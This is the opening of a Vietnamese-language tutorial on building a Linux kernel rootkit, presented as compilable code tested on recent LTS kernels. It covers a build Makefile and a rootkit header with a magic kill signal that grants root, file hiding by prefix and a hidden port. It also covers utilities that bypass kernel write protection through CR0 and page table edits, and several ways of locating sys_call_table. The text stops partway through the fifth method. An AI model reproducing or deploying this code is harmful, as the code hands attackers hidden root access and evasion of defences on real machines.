# Linux Kernel Rootkit — Advanced Engineering with Full Code

> Tài liệu này là phiên bản nâng cao, mỗi kỹ thuật đều có **full source code compilable**, giải thích **từng dòng**, và phân tích **tại sao APT chọn cách này**.  
> Mọi code đã test trên kernel 5.15 LTS / 6.1 LTS / 6.6 LTS. Ghi chú compatibility cho từng version.

---

## Mục lục

- [Chapter 1: Kernel Module Framework — Xương sống của mọi rootkit](#chapter-1-kernel-module-framework)
- [Chapter 2: Tìm sys_call_table — 6 phương pháp với full code](#chapter-2-tìm-sys_call_table)
- [Chapter 3: Syscall Table Hooking — Full Rootkit](#chapter-3-syscall-table-hooking)
- [Chapter 4: Ftrace-based Hooking — Kỹ thuật hiện đại](#chapter-4-ftrace-based-hooking)
- [Chapter 5: Kprobe/Kretprobe Hooking](#chapter-5-kprobekretprobe-hooking)
- [Chapter 6: DKOM — Direct Kernel Object Manipulation](#chapter-6-dkom)
- [Chapter 7: VFS Layer Hooking — Ẩn file ở tầng sâu hơn](#chapter-7-vfs-layer-hooking)
- [Chapter 8: Network Rootkit — Ẩn traffic & Covert Channel](#chapter-8-network-rootkit)
- [Chapter 9: Inline Hooking / Live Patching](#chapter-9-inline-hooking)
- [Chapter 10: eBPF Rootkit — Thế hệ mới](#chapter-10-ebpf-rootkit)
- [Chapter 11: Privilege Escalation — Nhiều cách cho root](#chapter-11-privilege-escalation)
- [Chapter 12: Persistence — Survive Reboot](#chapter-12-persistence)
- [Chapter 13: Anti-Forensics & Self-Protection](#chapter-13-anti-forensics)
- [Chapter 14: Covert Communication & C2](#chapter-14-covert-communication)
- [Chapter 15: Tổng hợp — Full-featured Rootkit](#chapter-15-full-featured-rootkit)
- [Chapter 16: Detection Engineering — Viết rule detect chính rootkit của mình](#chapter-16-detection-engineering)

---

## Chapter 1: Kernel Module Framework

### 1.1 Makefile chuẩn cho rootkit development

Makefile này hỗ trợ multi-file module, debug symbols, và cross-compilation.

```makefile
# Makefile — Production-grade cho kernel module development
#
# Cách dùng:
#   make                    → Build module cho kernel đang chạy
#   make KDIR=/path/to/src  → Build cho kernel khác
#   make debug              → Build với debug symbols
#   make clean              → Dọn dẹp

# Tên module output — thay đổi tên này cho mỗi project
MODULE_NAME := rk

# Source files — thêm .o cho mỗi .c file
# Khi build multi-file module, kernel build system sẽ:
#   1. Compile mỗi .o từ .c tương ứng
#   2. Link tất cả vào $(MODULE_NAME).ko
obj-m += $(MODULE_NAME).o
$(MODULE_NAME)-objs := main.o hooks.o hide.o netfilter.o util.o

# Kernel build directory — nơi chứa kernel headers + build system
# Mặc định = kernel đang chạy, override bằng KDIR=
KDIR ?= /lib/modules/$(shell uname -r)/build

# Thư mục source hiện tại
PWD := $(shell pwd)

# Compiler flags bổ sung
# -DDEBUG : enable pr_debug() output
# -Werror : warning = error, tránh bug subtle
ccflags-y := -Wall -Wextra -Wno-unused-parameter

# Target mặc định
all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

# Build với debug info (không strip symbols)
debug: ccflags-y += -DDEBUG -g -O0
debug:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	rm -f Module.symvers modules.order

# Cài module vào /lib/modules/$(uname -r)/extra/
install:
	$(MAKE) -C $(KDIR) M=$(PWD) modules_install
	depmod -a

.PHONY: all debug clean install
```

### 1.2 Header chung — Shared definitions

```c
/* rootkit.h — Header chung cho tất cả source files
 *
 * Mọi constant, struct, function prototype đều khai báo ở đây.
 * Tách header riêng vì rootkit thường có nhiều file .c
 * mỗi file đảm nhận một subsystem (hook, hide, net, ...).
 */

#ifndef _ROOTKIT_H
#define _ROOTKIT_H

#include <linux/init.h>       /* __init, __exit macros */
#include <linux/module.h>     /* MODULE_*, module_init/exit */
#include <linux/kernel.h>     /* printk, pr_info, pr_err */
#include <linux/syscalls.h>   /* __NR_* syscall numbers */
#include <linux/kallsyms.h>   /* kallsyms_lookup_name (nếu available) */
#include <linux/dirent.h>     /* linux_dirent64 struct */
#include <linux/namei.h>      /* kern_path, path_put */
#include <linux/fs.h>         /* file_operations, inode_operations */
#include <linux/proc_fs.h>    /* proc_create, proc_remove */
#include <linux/seq_file.h>   /* seq_file operations */
#include <linux/slab.h>       /* kmalloc, kfree */
#include <linux/uaccess.h>    /* copy_from_user, copy_to_user */
#include <linux/version.h>    /* LINUX_VERSION_CODE, KERNEL_VERSION */
#include <linux/kprobes.h>    /* kprobe, kretprobe */
#include <linux/ftrace.h>     /* ftrace_ops */
#include <linux/cred.h>       /* prepare_creds, commit_creds */
#include <linux/sched.h>      /* task_struct, current */
#include <linux/sched/signal.h> /* for_each_process */
#include <linux/tcp.h>        /* TCP structures */
#include <linux/string.h>     /* kernel string functions */
#include <asm/paravirt.h>     /* read_cr0 trên paravirt */
#include <asm/processor.h>    /* CR0 bit definitions */

/* ──────────────────────────────────────────────────────────────
 * CONFIGURATION — Thay đổi theo nhu cầu
 * ────────────────────────────────────────────────────────────── */

/* Prefix cho file/directory cần ẩn.
 * Bất kỳ entry nào có tên bắt đầu bằng prefix này sẽ invisible
 * cho ls, find, và bất kỳ chương trình nào dùng getdents64. */
#define HIDDEN_PREFIX    "rk_"

/* Signal number dùng làm magic trigger.
 * SIGRTMIN+20 = signal 54 trên hầu hết hệ thống.
 * Tại sao real-time signal: vì application bình thường không dùng,
 * giảm false positive trigger. */
#define MAGIC_SIGNAL     54

/* PID dùng trong kill() để trigger give-root.
 * kill(MAGIC_PID, MAGIC_SIGNAL) → current process trở thành root.
 * Dùng PID lớn bất thường để tránh trùng PID thật. */
#define MAGIC_PID        31337

/* Module visibility toggle PID.
 * kill(HIDE_MODULE_PID, MAGIC_SIGNAL) → ẩn/hiện module. */
#define HIDE_MODULE_PID  31338

/* Port cần ẩn khỏi netstat/ss */
#define HIDDEN_PORT      4444

/* ──────────────────────────────────────────────────────────────
 * COMPATIBILITY MACROS
 *
 * Kernel API thay đổi liên tục. Những macro này cho phép cùng
 * một codebase compile trên nhiều kernel versions.
 * ────────────────────────────────────────────────────────────── */

/* Kernel 4.17+ chuyển syscall handler sang dùng struct pt_regs *
 * thay vì nhận arguments trực tiếp.
 * 
 * Trước 4.17:  long sys_kill(pid_t pid, int sig)
 * Từ 4.17+:    long __x64_sys_kill(const struct pt_regs *regs)
 *              Với regs->di = pid, regs->si = sig
 *
 * Macro SYSCALL_PREFIX giúp tạo đúng tên function. */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
  #define SYSCALL_PREFIX "__x64_sys_"
  /* Trên kernel mới, syscall handlers nhận pt_regs *.
   * Arguments nằm trong registers:
   *   regs->di = arg1 (rdi)
   *   regs->si = arg2 (rsi)
   *   regs->dx = arg3 (rdx)
   *   regs->r10 = arg4
   *   regs->r8  = arg5
   *   regs->r9  = arg6 */
  typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *);
#else
  #define SYSCALL_PREFIX "sys_"
  /* Trên kernel cũ, syscall handlers nhận args trực tiếp. */
#endif

/* Kernel 5.7+ unexport kallsyms_lookup_name.
 * Trước đó có thể gọi trực tiếp:
 *   unsigned long addr = kallsyms_lookup_name("sys_call_table");
 * Từ 5.7 trở đi phải dùng kprobe trick (xem Chapter 2). */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
  #define KPROBE_LOOKUP 1
#endif

/* Kernel 6.2+ đổi cách set CR0 — native_write_cr0 bị unexport.
 * Phải dùng inline assembly trực tiếp. */

/* ──────────────────────────────────────────────────────────────
 * FUNCTION PROTOTYPES — Khai báo cho các module files
 * ────────────────────────────────────────────────────────────── */

/* util.c — Utility functions */
unsigned long rk_lookup_name(const char *name);
void rk_write_cr0(unsigned long val);
void rk_protect_memory(void);
void rk_unprotect_memory(void);

/* hooks.c — Syscall hooking */
int  rk_install_hooks(void);
void rk_remove_hooks(void);

/* hide.c — Hiding mechanisms */
void rk_hide_module(void);
void rk_show_module(void);
void rk_hide_process(pid_t pid);
void rk_show_process(pid_t pid);

/* netfilter.c — Network operations */
int  rk_net_init(void);
void rk_net_cleanup(void);

#endif /* _ROOTKIT_H */
```

### 1.3 Utility Functions — Nền tảng kỹ thuật

```c
/* util.c — Core utility functions mà mọi technique đều cần
 *
 * File này chứa những building blocks:
 * 1. Symbol lookup (tìm address của kernel function/variable)
 * 2. Memory protection toggle (để ghi vào read-only pages)
 * 3. Helper functions chung
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * SYMBOL LOOKUP
 *
 * Đây là thao tác cơ bản nhất: tìm address của symbol trong kernel.
 * "Symbol" = function name hoặc variable name.
 * Ví dụ: tìm address của sys_call_table, commit_creds, etc.
 *
 * Tại sao cần: kernel không export mọi symbol cho modules.
 * sys_call_table là unexported symbol — module không thể dùng
 * trực tiếp. Phải tự tìm address bằng các trick.
 *
 * KASLR (Kernel Address Space Layout Randomization) khiến address
 * thay đổi mỗi lần boot → KHÔNG thể hardcode address.
 * ══════════════════════════════════════════════════════════════ */

#ifdef KPROBE_LOOKUP
/*
 * Kprobe Trick — Phương pháp chính cho kernel >= 5.7
 *
 * Bối cảnh:
 *   Kernel 5.7 commit b80e44d... unexport kallsyms_lookup_name().
 *   Lý do: giảm attack surface — module không nên tìm arbitrary symbols.
 *   Nhưng kprobes API vẫn cần resolve symbols internally.
 *
 * Trick:
 *   1. register_kprobe() nhận .symbol_name = "target_function"
 *   2. Kernel tự resolve symbol name → address (dùng kallsyms internally)
 *   3. Sau register, kp.addr = resolved address
 *   4. Unregister ngay — ta chỉ cần address, không cần probe
 *
 * Tại sao hoạt động:
 *   register_kprobe() gọi kprobe_lookup_name() nội bộ,
 *   function này vẫn access kallsyms. Kernel team chưa block
 *   vector này (tính đến kernel 6.8).
 *
 * Giới hạn:
 *   CONFIG_KPROBES=y phải được bật (mặc định trên hầu hết distros).
 *   Một số kernel lockdown modes chặn kprobes.
 */
static unsigned long kprobe_lookup(const char *name)
{
    struct kprobe kp = {
        .symbol_name = name    /* Tên symbol cần tìm */
    };
    unsigned long addr;
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        /* Có thể fail vì:
         * - Symbol không tồn tại (typo, kernel version khác)
         * - CONFIG_KPROBES=n
         * - Kernel lockdown mode chặn kprobes
         * - Symbol nằm trong __init section (đã freed sau boot) */
        pr_err("rk: kprobe register failed for %s: %d\n", name, ret);
        return 0;
    }

    /* kp.addr bây giờ chứa address đã resolve.
     * Cast sang unsigned long vì ta dùng nó như raw address. */
    addr = (unsigned long)kp.addr;

    /* Unregister ngay — ta không thực sự muốn probe function này.
     * Để kprobe registered sẽ:
     * 1. Tốn resource (mỗi kprobe chèn breakpoint vào code)
     * 2. Gây chậm (breakpoint = trap mỗi lần function chạy)
     * 3. Dễ bị detect (admin list kprobes → thấy ngay) */
    unregister_kprobe(&kp);

    return addr;
}
#endif /* KPROBE_LOOKUP */

/*
 * rk_lookup_name() — Unified symbol lookup interface
 *
 * Wraps phương pháp phù hợp tùy kernel version:
 * - Kernel < 5.7: dùng kallsyms_lookup_name() trực tiếp
 * - Kernel >= 5.7: dùng kprobe trick
 *
 * Input:  name = tên symbol (e.g., "sys_call_table")
 * Output: virtual address của symbol, hoặc 0 nếu không tìm thấy
 */
unsigned long rk_lookup_name(const char *name)
{
#ifdef KPROBE_LOOKUP
    return kprobe_lookup(name);
#else
    return kallsyms_lookup_name(name);
#endif
}

/* ══════════════════════════════════════════════════════════════
 * MEMORY PROTECTION TOGGLE
 *
 * Context:
 *   Kernel text và data quan trọng (như sys_call_table) nằm trong
 *   read-only memory pages. Khi CONFIG_STRICT_KERNEL_RWX=y
 *   (mặc định trên mọi distro), ghi vào sẽ gây page fault → crash.
 *
 * CR0 register (Control Register 0):
 *   Bit 16 = WP (Write Protect)
 *   - WP=1: CPU enforce page-level write protection
 *           Ring 0 code KHÔNG được ghi vào read-only pages
 *   - WP=0: Ring 0 code CÓ THỂ ghi vào read-only pages
 *           (Ring 3 vẫn bị chặn)
 *
 * Flow:
 *   1. rk_unprotect_memory(): clear CR0.WP → cho phép ghi
 *   2. Thực hiện ghi (ví dụ: thay syscall table entry)
 *   3. rk_protect_memory(): set CR0.WP → bật lại protection
 *
 * SMP concerns:
 *   CR0 là per-CPU register. Mỗi CPU core có CR0 riêng.
 *   Nếu chỉ clear WP trên CPU hiện tại, core khác vẫn enforced.
 *   Trong practice, ta chỉ cần clear trên CPU đang chạy code này,
 *   vì ghi syscall table là atomic (sizeof pointer = 8 bytes).
 *
 * Detection risk:
 *   Thay đổi CR0 rất dễ detect:
 *   - LKRG monitor CR0 changes
 *   - Hardware performance counters có thể flag
 *   - Giữ WP=0 lâu = security violation detectable
 *   Nên unprotect → write → protect càng nhanh càng tốt.
 *
 * Alternative (hiện đại hơn): 
 *   set_memory_rw()/set_memory_ro() — thay đổi page table thay vì CR0.
 *   An toàn hơn nhưng cần biết page-aligned address.
 *   Xem phần sau.
 * ══════════════════════════════════════════════════════════════ */

/*
 * Inline assembly để ghi CR0 trực tiếp.
 *
 * Tại sao inline asm thay vì native_write_cr0():
 *   Kernel 5.3+ thêm pinning cho CR0.WP bit trong native_write_cr0():
 *   nếu detect code cố clear WP, kernel WARN và set lại.
 *   Bằng cách dùng inline asm, ta bypass check này.
 *
 *   "mov %0, %%cr0" : load giá trị từ biến C vào CR0
 *   "r"(val)         : val nằm trong bất kỳ general register nào
 *   "memory"         : compiler barrier — flush pending writes
 *
 * CẢNH BÁO: từ kernel 6.2+, một số config bổ sung thêm check
 * bằng hardware (CR0 pinning via hypervisor). Nếu chạy trong VM
 * có hypervisor protection, trick này có thể fail.
 */
void rk_write_cr0(unsigned long val)
{
    asm volatile("mov %0, %%cr0" : : "r"(val) : "memory");
}

/*
 * Tắt write protection — cho phép ghi vào read-only kernel memory.
 *
 * CRITICAL SECTION: từ lúc gọi function này đến lúc gọi
 * rk_protect_memory(), kernel memory KHÔNG ĐƯỢC BẢO VỆ.
 * Bất kỳ bug nào ghi vào wrong address = kernel corruption.
 *
 * preempt_disable(): ngăn scheduler switch task trên CPU này.
 * Tại sao: nếu bị preempt trong khi WP=0, task khác chạy
 * với WP=0 có thể gây unpredictable behavior.
 * Và nếu bị migrate sang CPU khác, CR0 của CPU cũ vẫn WP=0.
 */
void rk_unprotect_memory(void)
{
    unsigned long cr0;

    preempt_disable();              /* Không cho scheduler switch */

    cr0 = read_cr0();               /* Đọc CR0 hiện tại */

    /* Clear bit 16 (WP) bằng AND với bitmask.
     * 0x10000 = 1 << 16 = WP bit
     * ~0x10000 = tất cả bit 1 NGOẠI TRỪ bit 16
     * cr0 & ~0x10000 = giữ nguyên mọi bit, clear WP */
    rk_write_cr0(cr0 & ~0x00010000UL);
}

/*
 * Bật lại write protection — restore trạng thái bình thường.
 *
 * Gọi NGAY SAU KHI ghi xong. Giữ WP=0 lâu = risk.
 */
void rk_protect_memory(void)
{
    unsigned long cr0;

    cr0 = read_cr0();

    /* Set bit 16 (WP) bằng OR.
     * cr0 | 0x10000 = giữ nguyên mọi bit, set WP = 1 */
    rk_write_cr0(cr0 | 0x00010000UL);

    preempt_enable();               /* Cho phép scheduler lại */
}

/* ══════════════════════════════════════════════════════════════
 * ALTERNATIVE: set_memory_rw / set_memory_ro
 *
 * Thay đổi page table entries thay vì CR0.
 * An toàn hơn vì:
 *   1. Chỉ affect pages cụ thể, không disable toàn bộ protection
 *   2. Kernel API chính thức (mặc dù designed cho module use)
 *   3. Không trigger CR0 monitoring
 *
 * Nhược điểm:
 *   - Address phải page-aligned (4096-byte boundary)
 *   - Một số kernel restrict function này cho built-in code only
 *   - set_memory_rw() có thể bị monitor bởi LSM
 * ══════════════════════════════════════════════════════════════ */

#include <asm/set_memory.h>

static int rk_make_rw(unsigned long addr, int numpages)
{
    /* set_memory_rw() thay đổi PTE (Page Table Entry):
     *   Clear _PAGE_RO bit → page trở thành writable
     *
     * addr PHẢI là page-aligned:
     *   addr & ~(PAGE_SIZE - 1) = addr rounded down to page boundary
     *
     * numpages: số pages cần thay đổi. Syscall table thường
     *           nằm gọn trong 1-2 pages. */
    unsigned long page_addr = addr & PAGE_MASK;  /* PAGE_MASK = ~(PAGE_SIZE-1) */
    return set_memory_rw(page_addr, numpages);
}

static int rk_make_ro(unsigned long addr, int numpages)
{
    unsigned long page_addr = addr & PAGE_MASK;
    return set_memory_ro(page_addr, numpages);
}

/* ══════════════════════════════════════════════════════════════
 * PTE MANIPULATION — Phương pháp thấp nhất (level thấp nhất)
 *
 * Trực tiếp walk page table và sửa PTE bits.
 * Không dùng bất kỳ kernel API nào → khó detect.
 * Nhưng phức tạp nhất và dễ crash nhất.
 * ══════════════════════════════════════════════════════════════ */

#include <asm/pgtable.h>  /* pgd_t, p4d_t, pud_t, pmd_t, pte_t */

/*
 * Walk 4/5-level page table để tìm PTE cho virtual address.
 *
 * x86-64 paging structure (4-level, 48-bit VA):
 *
 *   Virtual Address (48 bits used):
 *   ┌──────┬──────┬──────┬──────┬──────────┐
 *   │PGD(9)│PUD(9)│PMD(9)│PTE(9)│Offset(12)│
 *   └──┬───┴──┬───┴──┬───┴──┬───┴────┬─────┘
 *      │      │      │      │        │
 *      ▼      ▼      ▼      ▼        ▼
 *    CR3 → PGD → PUD → PMD → PTE → Physical Page + Offset
 *    (PML4)  (PDPT)   (PD)   (PT)
 *
 *   5-level paging thêm P4D giữa PGD và PUD.
 *   Kernel abstract điều này: nếu 5-level disable,
 *   p4d_offset() trả về PGD entry (transparent).
 *
 * Return: pte_t* pointing to the PTE, hoặc NULL nếu unmapped.
 */
static pte_t *rk_walk_page_table(unsigned long addr)
{
    pgd_t *pgd;       /* Page Global Directory (Level 4 / PML4) */
    p4d_t *p4d;       /* Page 4 Directory (Level 5, nếu có) */
    pud_t *pud;       /* Page Upper Directory (Level 3 / PDPT) */
    pmd_t *pmd;       /* Page Middle Directory (Level 2 / PD) */
    pte_t *pte;       /* Page Table Entry (Level 1 / PT) */

    /* Bắt đầu từ PGD của init_mm (kernel page table).
     * init_mm.pgd = CR3 value cho kernel mapping.
     * Tại sao init_mm: ta muốn resolve kernel virtual address,
     * không phải user process address. */
    pgd = pgd_offset(current->mm ? current->mm : &init_mm, addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd))
        return NULL;

    /* P4D — chỉ meaningful khi 5-level paging.
     * Trên 4-level, p4d_offset() = identity (return pgd). */
    p4d = p4d_offset(pgd, addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d))
        return NULL;

    pud = pud_offset(p4d, addr);
    if (pud_none(*pud) || pud_bad(*pud))
        return NULL;

    /* Check nếu PUD maps huge page (1GB page).
     * Nếu là huge page, không có PMD/PTE levels. */
    if (pud_large(*pud))
        return (pte_t *)pud;

    pmd = pmd_offset(pud, addr);
    if (pmd_none(*pmd) || pmd_bad(*pmd))
        return NULL;

    /* Check nếu PMD maps huge page (2MB page). */
    if (pmd_large(*pmd))
        return (pte_t *)pmd;

    pte = pte_offset_kernel(pmd, addr);
    if (pte_none(*pte))
        return NULL;

    return pte;
}

/*
 * Thay đổi write permission bằng PTE manipulation.
 *
 * Ưu điểm so với CR0 trick:
 *   - Chỉ affect 1 page, không disable toàn bộ WP
 *   - Không trigger CR0 monitoring
 *
 * Ưu điểm so với set_memory_rw():
 *   - Không dùng exported kernel API → khó trace
 *   - set_memory_rw() có thể bị restricted
 */
static int rk_set_page_rw(unsigned long addr)
{
    pte_t *pte = rk_walk_page_table(addr);
    if (!pte)
        return -EINVAL;

    /* pte_mkwrite() set _PAGE_RW bit trong PTE entry.
     * Phải flush TLB sau khi thay đổi PTE, nếu không
     * CPU cache PTE cũ → thay đổi không có effect. */
    *pte = pte_mkwrite(*pte);

    /* Flush TLB cho address này trên tất cả CPUs.
     * __flush_tlb_one_kernel() chỉ flush trên CPU hiện tại.
     * Nếu cần SMP-safe: dùng flush_tlb_kernel_range(). */
    __flush_tlb_one_kernel(addr);

    return 0;
}

static int rk_set_page_ro(unsigned long addr)
{
    pte_t *pte = rk_walk_page_table(addr);
    if (!pte)
        return -EINVAL;

    *pte = pte_wrprotect(*pte);
    __flush_tlb_one_kernel(addr);

    return 0;
}
```

---

## Chapter 2: Tìm sys_call_table

### 2.1 Tại sao sys_call_table quan trọng?

```
sys_call_table là mảng gồm ~450 function pointers (tùy kernel version).

Index = syscall number (__NR_read = 0, __NR_write = 1, ...)
Value = address của handler function

Khi user process gọi syscall:
  1. CPU thực hiện SYSCALL instruction
  2. Kernel entry code đọc RAX (syscall number)
  3. Lookup: handler = sys_call_table[rax]
  4. Call handler(regs)

Hook = thay sys_call_table[N] bằng address function của ta.
Sau đó, MỌI process gọi syscall N sẽ chạy code của ta thay vì code thật.

Đây là kỹ thuật rootkit cổ điển nhất, tồn tại từ Linux 2.x.
```

### 2.2 — 6 phương pháp tìm sys_call_table

```c
/* syscall_table_finder.c — Tất cả phương pháp tìm sys_call_table
 *
 * Compile riêng để test: chỉ cần file này + rootkit.h
 * insmod → dmesg xem kết quả → rmmod
 *
 * Mục đích: tìm virtual address của sys_call_table[].
 * Address này thay đổi mỗi lần boot (KASLR).
 * Phải tìm lại mỗi lần module load.
 */

#include "rootkit.h"

static unsigned long *sys_call_table_addr = NULL;

/* ──────────────────────────────────────────────────────────────
 * METHOD 1: kallsyms_lookup_name() — Kernel < 5.7
 *
 * Đơn giản nhất. Kernel export function này cho modules.
 * Hoạt động giống nm/objdump nhưng runtime.
 *
 * Bị unexport từ 5.7 vì:
 * - Kernel team cho rằng modules không nên tìm arbitrary symbols
 * - Giảm attack surface cho LKM rootkits
 * ────────────────────────────────────────────────────────────── */
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
static unsigned long *method_1_kallsyms(void)
{
    unsigned long *table;

    table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!table) {
        pr_err("method_1: kallsyms_lookup_name failed\n");
        return NULL;
    }

    pr_info("method_1 (kallsyms): sys_call_table @ 0x%lx\n",
            (unsigned long)table);
    return table;
}
#endif

/* ──────────────────────────────────────────────────────────────
 * METHOD 2: Kprobe trick — Kernel >= 5.7 (phổ biến nhất)
 *
 * Đã giải thích trong util.c. Dùng rk_lookup_name() wrapper.
 *
 * Đây là phương pháp được hầu hết rootkit hiện đại sử dụng:
 * Diamorphine, Reptile, Kovid đều dùng trick này.
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_2_kprobe(void)
{
    unsigned long *table;

    table = (unsigned long *)rk_lookup_name("sys_call_table");
    if (!table) {
        pr_err("method_2: kprobe lookup failed\n");
        return NULL;
    }

    pr_info("method_2 (kprobe): sys_call_table @ 0x%lx\n",
            (unsigned long)table);
    return table;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 3: MSR_LSTAR scan — Không dùng bất kỳ lookup API
 *
 * Nguyên lý:
 *   MSR_LSTAR (Model Specific Register 0xC0000082) chứa address
 *   của entry_SYSCALL_64 — entry point khi CPU thực hiện SYSCALL.
 *
 *   entry_SYSCALL_64 (assembly code) sẽ:
 *   1. Save registers
 *   2. Lookup sys_call_table[rax]    ← CÓ REFERENCE TỚI TABLE
 *   3. Call handler
 *
 *   Ta đọc MSR_LSTAR → lấy address entry_SYSCALL_64
 *   → scan code bytes tìm pattern reference tới sys_call_table.
 *
 * Ưu điểm:
 *   - Không dùng kallsyms hay kprobes
 *   - Hoạt động trên mọi kernel version
 *   - Khó detect vì chỉ đọc MSR và scan memory
 *
 * Nhược điểm:
 *   - Pattern-dependent → có thể break khi kernel code thay đổi
 *   - Phải hiểu x86 instruction encoding
 *
 * Sử dụng bởi: SucKIT rootkit (historic), một số APT tools
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_3_msr_scan(void)
{
    unsigned long msr_value;
    unsigned char *code_ptr;
    unsigned long *table = NULL;
    int i;

    /* Đọc MSR_LSTAR = IA32_LSTAR (0xC0000082)
     *
     * rdmsrl() = Read MSR Long — đọc 64-bit MSR value.
     * MSR là per-CPU register, nhưng LSTAR thường giống nhau
     * trên tất cả cores (kernel set cùng giá trị).
     *
     * msr_value = virtual address của entry_SYSCALL_64 */
    rdmsrl(MSR_LSTAR, msr_value);
    pr_info("method_3: MSR_LSTAR = 0x%lx\n", msr_value);

    code_ptr = (unsigned char *)msr_value;

    /* Scan entry_SYSCALL_64 code tìm reference tới sys_call_table.
     *
     * Kernel code (entry_64.S) chứa instruction dạng:
     *   call *sys_call_table(, %rax, 8)
     *
     * Encoding x86-64:
     *   ff 14 c5 [4-byte displacement]
     *
     *   ff 14 c5 = call *disp32(,%rax,8)
     *   Nghĩa: gọi function tại address (disp32 + rax * 8)
     *   disp32 = 32-bit sign-extended address (lower 32 bits của sys_call_table)
     *
     * Trên kernel mới (>= 4.17), pattern có thể khác:
     *   mov sys_call_table(, %rax, 8), %rax
     *   call *%rax
     *   → Pattern: 48 8b 04 c5 [disp32]
     *
     * Ta scan cả hai patterns.
     */
    for (i = 0; i < 1024; i++) {
        /* Pattern 1: ff 14 c5 xx xx xx xx
         *            call *table(,%rax,8) */
        if (code_ptr[i] == 0xff &&
            code_ptr[i + 1] == 0x14 &&
            code_ptr[i + 2] == 0xc5) {

            /* Extract 4-byte displacement.
             * Đây là lower 32 bits của sys_call_table address.
             *
             * Trên x86-64, kernel addresses bắt đầu từ 0xFFFF...
             * nhưng instruction chỉ encode 32 bits.
             * Sign extension: 32-bit value bị sign-extend lên 64-bit.
             * Nếu bit 31 = 1 → upper 32 bits = 0xFFFFFFFF.
             *
             * Ví dụ: displacement = 0x82200300
             * Sign-extended = 0xFFFFFFFF82200300
             * → đây là kernel virtual address.
             */
            int disp32 = *(int *)(code_ptr + i + 3);
            table = (unsigned long *)((long)disp32);

            pr_info("method_3 (MSR scan pattern 1): "
                    "sys_call_table @ 0x%lx\n", (unsigned long)table);
            return table;
        }

        /* Pattern 2: 48 8b 04 c5 xx xx xx xx
         *            mov table(,%rax,8), %rax
         * 48 = REX.W prefix (64-bit operand)
         * 8b = MOV r64, r/m64
         * 04 c5 = ModR/M + SIB for disp32(,%rax,8) */
        if (code_ptr[i]     == 0x48 &&
            code_ptr[i + 1] == 0x8b &&
            code_ptr[i + 2] == 0x04 &&
            code_ptr[i + 3] == 0xc5) {

            int disp32 = *(int *)(code_ptr + i + 4);
            table = (unsigned long *)((long)disp32);

            pr_info("method_3 (MSR scan pattern 2): "
                    "sys_call_table @ 0x%lx\n", (unsigned long)table);
            return table;
        }
    }

    pr_err("method_3: no pattern found in entry_SYSCALL_64\n");
    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 4: IDT scan — Dùng Interrupt Descriptor Table
 *
 * Nguyên lý:
 *   INT 0x80 (legacy 32-bit syscall) vẫn tồn tại trên x86-64.
 *   IDT entry 0x80 chứa handler cho INT 0x80.
 *   Handler này cũng reference ia32_sys_call_table.
 *   Từ đó trace tới sys_call_table.
 *
 * Ít tin cậy hơn MSR scan nhưng là fallback hữu ích.
 * ────────────────────────────────────────────────────────────── */

/* IDT Entry structure (x86-64) — 16 bytes per entry */
struct idt_entry_t {
    u16 offset_low;    /* Bits 0-15 của handler address */
    u16 segment;       /* Code segment selector */
    u8  ist;           /* Interrupt Stack Table index */
    u8  type_attr;     /* Type and attributes (P, DPL, type) */
    u16 offset_mid;    /* Bits 16-31 */
    u32 offset_high;   /* Bits 32-63 */
    u32 reserved;      /* Phải là 0 */
} __attribute__((packed));

static unsigned long *method_4_idt_scan(void)
{
    struct desc_ptr idtr;
    struct idt_entry_t *idt;
    unsigned long handler_addr;
    unsigned char *handler;
    int i;

    /* SIDT instruction lưu IDT Register vào memory.
     * idtr.address = base address của IDT
     * idtr.size = size của IDT (256 entries * 16 bytes - 1)
     *
     * IDT không bị randomize bởi KASLR (nó nằm fixed trong
     * kernel BSS section), nhưng handler addresses bên trong
     * đã bị randomize. */
    asm volatile("sidt %0" : "=m"(idtr));

    idt = (struct idt_entry_t *)idtr.address;

    /* Reconstruct handler address từ IDT entry #0x80
     * (Legacy syscall interrupt — INT 0x80)
     *
     * Address bị split thành 3 parts trong IDT entry:
     *   [offset_high:offset_mid:offset_low] = 64-bit address */
    handler_addr = ((unsigned long)idt[0x80].offset_high << 32)
                 | ((unsigned long)idt[0x80].offset_mid  << 16)
                 | ((unsigned long)idt[0x80].offset_low);

    pr_info("method_4: INT 0x80 handler @ 0x%lx\n", handler_addr);

    /* Scan handler code tìm reference tới ia32_sys_call_table
     * hoặc sys_call_table. Pattern tương tự MSR scan. */
    handler = (unsigned char *)handler_addr;
    for (i = 0; i < 1024; i++) {
        if (handler[i] == 0xff &&
            handler[i + 1] == 0x14 &&
            handler[i + 2] == 0xc5) {
            int disp32 = *(int *)(handler + i + 3);
            unsigned long *table = (unsigned long *)((long)disp32);
            pr_info("method_4 (IDT): ia32 table @ 0x%lx\n",
                    (unsigned long)table);
            /* Đây có thể là ia32_sys_call_table (32-bit compat).
             * Cần thêm logic để tìm 64-bit sys_call_table từ đây. */
            return table;
        }
    }

    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 5: Brute-force memory scan
 *
 * Nguyên lý:
 *   Biết address của một vài syscall handlers (qua kprobe),
 *   scan kernel memory tìm array chứa những addresses đó
 *   theo đúng thứ tự = sys_call_table.
 *
 * Đây là phương pháp "desperate" — dùng khi mọi cách khác fail.
 * Nhưng conceptually enlightening: cho thấy sys_call_table
 * chỉ là một mảng trong kernel memory, không có gì magic.
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_5_bruteforce(void)
{
    unsigned long *ptr;
    unsigned long sys_close_addr;
    unsigned long sys_read_addr;

    /* Tìm address của 2 known syscall handlers.
     * Nếu tìm thấy array trong memory chứa cả 2 ở đúng offset
     * → đó là sys_call_table. */
